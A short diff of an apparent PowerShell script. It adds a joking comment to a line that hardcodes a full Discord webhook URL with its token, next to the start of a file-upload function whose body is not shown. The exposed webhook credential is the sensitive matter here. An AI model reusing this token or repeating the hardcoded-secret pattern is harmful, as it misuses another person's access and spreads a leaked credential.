@@ -7,7 +7,7 @@ $ErrorActionPreference = 'Stop'
 Clear-Host
 
 # Define Variables
-$hookurl = "https://discord.com/api/webhooks/1125728627888234516/SFmXm6VlWQSp3IfBJJu8kqAJ0gnXnc3uDJeh4-LwwIS9Rf5MS1p62RblonxyQuEr0DNN"
+$hookurl = "https://discord.com/api/webhooks/1125728627888234516/SFmXm6VlWQSp3IfBJJu8kqAJ0gnXnc3uDJeh4-LwwIS9Rf5MS1p62RblonxyQuEr0DNN" #Please don't upload files to my Discord server lol
 
 # Define Functions
 function New-DiscordFileUpload {
